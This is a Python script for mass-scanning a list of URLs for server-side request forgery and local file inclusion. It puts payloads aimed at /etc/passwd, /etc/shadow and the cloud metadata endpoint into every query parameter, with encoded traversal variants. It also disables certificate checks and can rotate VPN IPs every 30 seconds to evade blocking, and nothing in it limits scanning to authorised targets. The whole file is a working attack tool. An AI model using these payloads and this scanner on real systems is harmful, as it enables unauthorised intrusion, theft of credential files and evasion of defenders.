import requests
import urllib.parse
import threading
import time
import random
import subprocess
import argparse
from queue import Queue
from colorama import Fore, Style, init
import urllib3

# Initialize colorama
init()

# Suppress InsecureRequestWarning
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# SSRF Payloads
ssrf_payloads = [
    '127.0.0.1',
    '2130706433',
    '017700000001',
    '127.1',
    '127.5.5.5',
    'http://localhost',
    'http://127.0.0.1',
    'http://127.1/admin',
    'file:///etc/passwd',
    'file:///etc/shadow',
    'http://169.254.169.254/latest/metadata/',
    'http://localhost:80',
    'http://localhost:8080',
    'http://127.0.0.1:8080',
    'http://127.0.0.1:8000',
    'http://127.0.0.1:8888',
    'http://0.0.0.0:80',
    'http://0.0.0.0:8080'
]

# LFI Payloads
lfi_payloads = [
    '/etc/passwd',
    '/etc/shadow',
    '/var/www/images/../../../etc/passwd',
    '../../../../../../../../../../../../../../../../../../etc/passwd',
    '....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2F%2Fpasswd',
    '....%252F%252F....%252F%252F....%252F%252F....%252F%252F....%252F%252F....%252F%252F....%252F%252F....%252F%252F....%252F%252Fetc%252F%252Fpasswd',
    '../../../etc/passwd%00.png',
    '../../../etc/passwd%00.jpeg',
    '../../../../etc/group'
]

vpn_change_signal = threading.Event()
log_lock = threading.Lock()
progress_lock = threading.Lock()
progress = 0
total_urls = 0

def change_vpn_ip(debug):
    while True:
        cmd = """
        regions=$(piactl get regions)
        selected_region=$(echo "$regions" | shuf -n 1)
        piactl set region $selected_region
        piactl connect
        """
        try:
            subprocess.run(['bash', '-c', cmd], check=True)
            time.sleep(8)  # Wait for 8 seconds to ensure VPN connects
            if debug:
                with log_lock:
                    print("VPN IP changed successfully.")
            vpn_change_signal.set()  # Signal that VPN has connected
        except subprocess.CalledProcessError as e:
            if debug:
                with log_lock:
                    print(f"Error changing VPN IP: {e}")
        vpn_change_signal.clear()  # Clear the signal
        time.sleep(30)

def scan_url(url, payloads, timeout, delay, debug):
    parsed_url = urllib.parse.urlparse(url)
    params = urllib.parse.parse_qs(parsed_url.query)
    for payload in payloads:
        modified_params = {key: payload for key in params.keys()}
        new_query = urllib.parse.urlencode(modified_params, doseq=True)
        new_url = urllib.parse.urlunparse(parsed_url._replace(query=new_query))
        for _ in range(3):  # Retry 3 times
            try:
                response = requests.get(new_url, timeout=timeout, verify=False)
                status_code = response.status_code
                color = get_status_code_color(status_code)
                if is_vulnerable(response, payload) and not check_false_positive(response, payload):
                    with log_lock:
                        print(f"{color}Vulnerable: {new_url} (Status Code: {status_code}){Style.RESET_ALL}")
                    return
                else:
                    with log_lock:
                        if debug:
                            print(f"{color}Not Vulnerable: {new_url} (Status Code: {status_code}){Style.RESET_ALL}")
                    break
            except requests.RequestException as e:
                with log_lock:
                    if debug:
                        print(f"Error with URL {new_url}: {e}")
                time.sleep(1)  # Delay before retry
            time.sleep(delay / 1000.0)  # Delay between requests in milliseconds

def get_status_code_color(status_code):
    """Return the color for the status code."""
    if 200 <= status_code <= 299:
        return Fore.GREEN
    elif 300 <= status_code <= 399:
        return Fore.BLUE
    elif 400 <= status_code <= 499:
        return Fore.YELLOW
    elif 500 <= status_code <= 599:
        return Fore.CYAN
    else:
        return Fore.WHITE

def is_vulnerable(response, payload):
    """Check if the response indicates a successful attack."""
    lower_response = response.text.lower()
    lower_payload = payload.lower()
    # Additional checks for SSRF and LFI
    if "root:" in lower_response or "admin" in lower_response or "administrator" in lower_response:
        return True
    if "127.0.0.1" in lower_response or "localhost" in lower_response:
        return True
    # Check for LFI specific indicators
    if "root:x:" in lower_response or "daemon:x:" in lower_response:
        return True
    if lower_payload in lower_response:
        return True
    return False

def check_false_positive(response, payload):
    """Check if the reflection is a false positive by analyzing the context."""
    lower_response = response.text.lower()
    lower_payload = payload.lower()
    if lower_payload in lower_response:
        # Check if the payload is in a benign context
        for context in ['"', "'", '>', '<', '=', '/', '\\']:
            if f"{context}{lower_payload}" in lower_response or f"{lower_payload}{context}" in lower_response:
                return True
        # Add more sophisticated checks if needed
    return False

def worker(queue, payloads, timeout, delay, debug):
    global progress
    while not queue.empty():
        vpn_change_signal.wait()  # Wait for VPN to connect
        url = queue.get()
        scan_url(url, payloads, timeout, delay, debug)
        with progress_lock:
            progress += 1
        queue.task_done()

def progress_thread(total_urls):
    global progress
    while progress < total_urls:
        with progress_lock:
            print(f"Progress: [{progress}/{total_urls}]", end='\r')
        time.sleep(1)  # Update every second
    print(f"Progress: [{total_urls}/{total_urls}] - Completed!")

def main():
    parser = argparse.ArgumentParser(description='SSRF and LFI Scanner')
    parser.add_argument('-t', '--threads', type=int, default=5, help='Number of threads')
    parser.add_argument('-d', '--delay', type=int, default=30, help='Delay between requests in milliseconds')
    parser.add_argument('-v', '--vpn', action='store_true', help='Change VPN IP every 30 seconds')
    parser.add_argument('-s', '--ssrf', action='store_true', help='Use SSRF payloads')
    parser.add_argument('-l', '--lfi', action='store_true', help='Use LFI payloads')
    parser.add_argument('-u', '--urls', type=str, required=True, help='File containing URLs to scan')
    parser.add_argument('--timeout', type=int, default=3, help='Request timeout in seconds')
    parser.add_argument('--debug', action='store_true', help='Enable debug info')
    args = parser.parse_args()

    if not (args.ssrf or args.lfi):
        print("Please specify at least one payload type: --ssrf or --lfi")
        return

    global total_urls

    payloads = []
    if args.ssrf:
        payloads.extend(ssrf_payloads)
    if args.lfi:
        payloads.extend(lfi_payloads)

    queue = Queue()
    with open(args.urls, 'r') as file:
        for line in file:
            queue.put(line.strip())

    total_urls = queue.qsize()

    if args.vpn:
        threading.Thread(target=change_vpn_ip, args=(args.debug,), daemon=True).start()

    threading.Thread(target=progress_thread, args=(total_urls,), daemon=True).start()

    for _ in range(args.threads):
        threading.Thread(target=worker, args=(queue, payloads, args.timeout, args.delay, args.debug), daemon=True).start()

    queue.join()

if __name__ == '__main__':
    main()
